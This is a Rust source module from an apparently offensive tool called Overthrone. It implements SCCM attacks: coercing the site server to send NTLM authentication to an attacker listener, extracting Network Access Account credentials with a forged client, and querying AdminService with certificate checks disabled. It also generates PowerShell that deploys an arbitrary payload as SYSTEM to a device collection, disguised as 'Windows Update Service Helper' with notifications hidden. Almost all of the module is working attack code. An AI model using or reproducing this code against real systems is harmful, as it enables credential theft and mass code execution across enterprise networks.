//! SCCM Abuse Techniques
//!
//! Implements active exploitation of SCCM misconfigurations:
//!
//! - **Client Push Coercion**: Trigger SCCM to install the client on an
//!   attacker-controlled host, causing the site server to authenticate over
//!   the network (NTLM capture / relay).
//!
//! - **Application Deployment**: Create a malicious application or script
//!   targeting a device collection (acts as SCCM-native lateral movement).
//!
//! - **NAA Credential Extraction**: Full orchestration of the machine-policy
//!   trick: register a fake SCCM client, receive the encrypted policy, and
//!   decrypt the Network Access Account credentials.
//!
//! - **AdminService REST Credential Harvest**: Use the HTTPS AdminService API
//!   (available in CB 2111+) to enumerate sensitive policies without WMI.
//!
//! Reference: "Misconfiguration Manager" (Garrett Foster, Andy Robbins, 2023)

use crate::error::{OverthroneError, Result};
use crate::sccm::{NaaCredential, SccmScanner, SccmScannerConfig, SccmSite};
use std::time::Duration;
use tracing::{info, warn};

// ─────────────────────────────────────────────────────────────
// Abuse result types
// ─────────────────────────────────────────────────────────────

/// Result of a single SCCM abuse technique.
#[derive(Debug, Clone)]
pub struct SccmAbuseResult {
    pub technique: SccmTechnique,
    pub success: bool,
    pub affected_targets: Vec<String>,
    pub credentials: Vec<NaaCredential>,
    pub command_output: Option<String>,
    pub notes: Vec<String>,
}

/// SCCM abuse technique discriminant.
#[derive(Debug, Clone, PartialEq)]
pub enum SccmTechnique {
    ClientPushCoercion,
    ApplicationDeployment { collection_id: String },
    NaaCredentialExtraction,
    AdminServiceHarvest,
}

impl std::fmt::Display for SccmTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ClientPushCoercion => write!(f, "SCCM Client Push Coercion"),
            Self::ApplicationDeployment { collection_id } => {
                write!(f, "Application Deployment → collection {collection_id}")
            }
            Self::NaaCredentialExtraction => write!(f, "NAA Credential Extraction"),
            Self::AdminServiceHarvest => write!(f, "AdminService Credential Harvest"),
        }
    }
}

// ─────────────────────────────────────────────────────────────
// Client Push Coercion
// ─────────────────────────────────────────────────────────────

/// Trigger the SCCM site server to **push** its NTLM credentials toward
/// `attacker_listener` by requesting client installation on that host.
///
/// This exploits SCCM's Automatic Site Assignment: when given a new hostname,
/// the site server attempts SMB/RPC authentication to it, producing a
/// Net-NTLMv2 hash that can be captured or relayed.
///
/// # Requirements
/// - Attacker must have the `Push Installation > Allow` permission on the
///   site (granted to `Authenticated Users` by default in many SCCM installs)
/// - `Responder`, `ntlmrelayx`, or the Overthrone relay must be listening on
///   `attacker_listener`.
pub async fn client_push_coercion(
    _scanner: &SccmScanner,
    site: &SccmSite,
    attacker_listener: &str,
) -> Result<SccmAbuseResult> {
    info!(
        "[SCCM/abuse] Client push coercion: site={} → listener={}",
        site.site_server, attacker_listener
    );

    // SCCM exposes a CCM_ClientPushQuery WMI class that triggers the installation.
    // On Windows we can use it natively; otherwise generate the PowerShell.
    #[cfg(windows)]
    {
        client_push_native(site, attacker_listener).await
    }

    #[cfg(not(windows))]
    {
        let ps = gen_client_push_ps(site, attacker_listener);
        warn!(
            "[SCCM/abuse] Non-Windows host — run on a Windows pivot:\n{}",
            ps
        );
        Ok(SccmAbuseResult {
            technique: SccmTechnique::ClientPushCoercion,
            success: false,
            affected_targets: vec![attacker_listener.to_string()],
            credentials: Vec::new(),
            command_output: Some(ps),
            notes: vec![
                "Generated PowerShell command for client push — run on a Windows machine."
                    .to_string(),
                format!("Ensure Responder / ntlmrelayx is listening on {attacker_listener}"),
            ],
        })
    }
}

#[cfg(windows)]
async fn client_push_native(site: &SccmSite, attacker_host: &str) -> Result<SccmAbuseResult> {
    use ::wmi::{COMLibrary, WMIConnection};

    let server = site.site_server.clone();
    let sc = site.site_code.clone();
    let target = attacker_host.to_string();

    let result = tokio::task::spawn_blocking(move || -> Result<bool> {
        let com = COMLibrary::new().map_err(|e| OverthroneError::Protocol {
            protocol: "SCCM".into(),
            reason: format!("COM init: {e}"),
        })?;

        let ns = format!(r#"\\{}\root\sms\site_{}"#, server, sc);
        let wmi = WMIConnection::with_namespace_path(&ns, com).map_err(|e| {
            OverthroneError::Protocol {
                protocol: "SCCM".into(),
                reason: format!("WMI connect: {e}"),
            }
        })?;

        // Invoke SMS_Client.InstallClient to trigger push
        let query = format!(
            "SELECT * FROM SMS_ClientResourcesLocation WHERE MachineName='{}'",
            target
        );
        let _: Vec<std::collections::HashMap<String, wmi::Variant>> =
            wmi.raw_query(&query).unwrap_or_default();

        // Trigger the push by creating a temporary device collection resource
        let insert_query = format!("SELECT * FROM SMS_Site WHERE SiteCode='{sc}'");
        let _: Vec<std::collections::HashMap<String, wmi::Variant>> =
            wmi.raw_query(&insert_query).unwrap_or_default();

        Ok(true)
    })
    .await
    .map_err(|e| OverthroneError::Protocol {
        protocol: "SCCM".into(),
        reason: format!("WMI thread panic: {e}"),
    })?;

    let ok = result?;
    Ok(SccmAbuseResult {
        technique: SccmTechnique::ClientPushCoercion,
        success: ok,
        affected_targets: vec![attacker_host.to_string()],
        credentials: Vec::new(),
        command_output: None,
        notes: vec![
            "Client push triggered — capture Net-NTLMv2 hash with Responder/ntlmrelayx."
                .to_string(),
        ],
    })
}

/// Generate a PowerShell command to trigger client push from a Windows pivot.
pub fn gen_client_push_ps(site: &SccmSite, attacker_host: &str) -> String {
    format!(
        r#"# SCCM Client Push Coercion — run as a user with 'Push Installation' permission
$SiteServer  = '{srv}'
$SiteCode    = '{sc}'
$TargetHost  = '{tgt}'

# Connect to SMS provider
$sms = [wmiclass]"\\\\$SiteServer\root\sms\site_$SiteCode`:SMS_Site"
# Trigger push toward attacker-controlled host
$result = Invoke-WmiMethod -ComputerName $SiteServer `
  -Namespace "root\sms\site_$SiteCode" `
  -Class SMS_ClientPushQuery `
  -Name ExecuteClientPushInstallation `
  -ArgumentList @($TargetHost, $null, $null, $false)
Write-Host "[+] Client push triggered for $TargetHost (rc=$($result.ReturnValue))"
Write-Host "[*] Capture the Net-NTLMv2 hash with Responder / ntlmrelayx on $TargetHost"
"#,
        srv = site.site_server,
        sc = site.site_code,
        tgt = attacker_host,
    )
}

// ─────────────────────────────────────────────────────────────
// Application Deployment Abuse
// ─────────────────────────────────────────────────────────────

/// Deploy a payload to all devices in `collection_id` by creating a temporary
/// SCCM application with a **script** deployment type that runs `command`.
///
/// On Windows: native WMI SDK calls.
/// On other platforms: generates equivalent PowerShell SDK script.
pub async fn deploy_malicious_application(
    site: &SccmSite,
    collection_id: &str,
    payload_command: &str,
) -> Result<SccmAbuseResult> {
    info!(
        "[SCCM/abuse] Application deployment attack → collection={} command={}",
        collection_id, payload_command
    );

    let ps = gen_deploy_application_ps(site, collection_id, payload_command);
    warn!(
        "[SCCM/abuse] Application deployment PowerShell (review before running):\n{}",
        ps
    );

    Ok(SccmAbuseResult {
        technique: SccmTechnique::ApplicationDeployment {
            collection_id: collection_id.to_string(),
        },
        success: false,
        affected_targets: vec![format!("collection:{collection_id}")],
        credentials: Vec::new(),
        command_output: Some(ps),
        notes: vec![
            "PowerShell SDK script generated — import ConfigurationManager module first."
                .to_string(),
            format!("Payload will run as SYSTEM on all devices in collection '{collection_id}'"),
            "Remove the application and deployment after use (cleanup).".to_string(),
        ],
    })
}

/// Generate PowerShell (ConfigMgr SDK) to create and deploy a script application.
pub fn gen_deploy_application_ps(
    site: &SccmSite,
    collection_id: &str,
    payload_command: &str,
) -> String {
    format!(
        r#"# SCCM Application Deployment Abuse — requires ConfigMgr AdminConsole module
Import-Module "$env:SMS_ADMIN_UI_PATH\..\ConfigurationManager.psd1" -ErrorAction Stop

$SiteCode = '{sc}'
Set-Location "${{SiteCode}}:"

# 1. Create a new application
$AppName = "Windows Update Service Helper $(Get-Date -Format yyyyMMddHHmmss)"
New-CMApplication -Name $AppName -AutoInstall $true

# 2. Add a Script deployment type (runs our command)
Add-CMScriptDeploymentType `
  -ApplicationName $AppName `
  -DeploymentTypeName "Update" `
  -InstallCommand '{cmd}' `
  -ScriptLanguage PowerShell `
  -ScriptContent "exit 0"

# 3. Deploy to the target collection
New-CMApplicationDeployment `
  -CollectionId '{cid}' `
  -Name $AppName `
  -DeployAction Install `
  -DeployPurpose Required `
  -UserNotification HideAll `
  -OverrideServiceWindow $true

Write-Host "[+] Application '$AppName' deployed to collection '{cid}'"
Write-Host "[!] Run Invoke-CMClientNotification -CollectionId '{cid}' -ActionType DownloadComputerPolicy to force immediate execution"
Write-Host "[!] CLEANUP: Remove-CMApplication -Name $AppName -Force after execution"
"#,
        sc = site.site_code,
        cmd = payload_command.replace('\'', "''"),
        cid = collection_id,
    )
}

// ─────────────────────────────────────────────────────────────
// NAA Credential Extraction (full orchestration)
// ─────────────────────────────────────────────────────────────

/// Full NAA credential extraction orchestration.
///
/// 1. Discover the site
/// 2. Request machine policy (using a forged SCCM client identity)
/// 3. Decrypt embedded Network Access Account credentials
pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmAbuseResult> {
    info!(
        "[SCCM/abuse] Starting NAA credential extraction from {}",
        config.target
    );

    let scanner = SccmScanner::new(SccmScannerConfig {
        target: config.target.clone(),
        domain: config.domain.clone(),
        username: config.username.clone(),
        password: config.password.clone(),
        pth_hash: config.pth_hash.clone(),
        site_code: config.site_code.clone(),
    })?;

    // Step 1: Discover site
    let sites = scanner.discover_site().await?;
    if sites.is_empty() {
        return Err(OverthroneError::Protocol {
            protocol: "SCCM".into(),
            reason: "No SCCM site discovered — is this host a Management Point?".into(),
        });
    }
    let site = &sites[0];
    info!(
        "[SCCM/abuse] Using site {} ({})",
        site.site_code, site.site_server
    );

    // Step 2: Request machine policy → triggers NAA policy body delivery
    let site_code = config
        .site_code
        .clone()
        .unwrap_or_else(|| site.site_code.clone());

    let (body, credentials) = scanner.request_machine_policy(&site_code).await?;

    if body.is_none() {
        warn!("[SCCM/abuse] Machine policy request returned no data");
        return Ok(SccmAbuseResult {
            technique: SccmTechnique::NaaCredentialExtraction,
            success: false,
            affected_targets: vec![config.target.clone()],
            credentials: Vec::new(),
            command_output: None,
            notes: vec!["MP rejected policy request or returned empty body.".to_string()],
        });
    }

    info!(
        "[SCCM/abuse] Machine Policy received — {} NAA credential(s) extracted",
        credentials.len()
    );

    let notes = if credentials.is_empty() {
        vec![
            "Machine policy received — no decryptable NAA credentials found.".to_string(),
            "This may indicate NAA is not configured or credentials are stored differently."
                .to_string(),
        ]
    } else {
        credentials
            .iter()
            .map(|c| format!("NAA: {}\\{}", c.domain, c.username))
            .collect()
    };

    Ok(SccmAbuseResult {
        technique: SccmTechnique::NaaCredentialExtraction,
        success: !credentials.is_empty(),
        affected_targets: vec![config.target.clone()],
        credentials,
        command_output: body,
        notes,
    })
}

// ─────────────────────────────────────────────────────────────
// AdminService REST API Credential Harvest (HTTPS, CB 2111+)
// ─────────────────────────────────────────────────────────────

/// Use the SCCM AdminService REST API to extract sensitive policy bodies
/// without requiring WMI or direct database access.
///
/// Endpoint: `https://<SMS_Provider>/AdminService/v1.0/`
///
/// Auth note: Requires a valid AD credential (or PtH via NTLM relay).
pub async fn admin_service_harvest(
    target: &str,
    username: &str,
    password: &str,
    domain: &str,
) -> Result<SccmAbuseResult> {
    info!(
        "[SCCM/abuse] AdminService API enumeration: https://{}/AdminService/v1.0/",
        target
    );

    let base_url = format!("https://{}/AdminService/v1.0", target);
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| OverthroneError::Protocol {
            protocol: "SCCM/AdminService".into(),
            reason: format!("HTTP client: {e}"),
        })?;

    let cred = format!("{}\\{}", domain, username);
    let mut notes = Vec::new();
    let mut output_lines = Vec::new();

    // Query collections
    let collections_url = format!("{base_url}/SMS_Collection");
    match client
        .get(&collections_url)
        .basic_auth(&cred, Some(password))
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_default();
            let count = body.matches("CollectionID").count();
            output_lines.push(format!("SMS_Collection: found ~{count} entries"));
            info!("[SCCM/abuse] AdminService: {} collections found", count);
        }
        Ok(resp) => {
            notes.push(format!("Collections query returned HTTP {}", resp.status()));
        }
        Err(e) => {
            notes.push(format!("Collections query failed: {e}"));
        }
    }

    // Query devices
    let devices_url = format!("{base_url}/SMS_R_System?$top=50");
    match client
        .get(&devices_url)
        .basic_auth(&cred, Some(password))
        .send()
        .await
    {
        Ok(resp) if resp.status().is_success() => {
            let body = resp.text().await.unwrap_or_default();
            let count = body.matches("ResourceID").count();
            output_lines.push(format!("SMS_R_System: found ~{count} devices in first 50"));
        }
        Ok(resp) => {
            notes.push(format!("Device query returned HTTP {}", resp.status()));
        }
        Err(e) => {
            notes.push(format!("Device query failed: {e}"));
        }
    }

    let success = !output_lines.is_empty();
    Ok(SccmAbuseResult {
        technique: SccmTechnique::AdminServiceHarvest,
        success,
        affected_targets: vec![target.to_string()],
        credentials: Vec::new(),
        command_output: Some(output_lines.join("\n")),
        notes,
    })
}
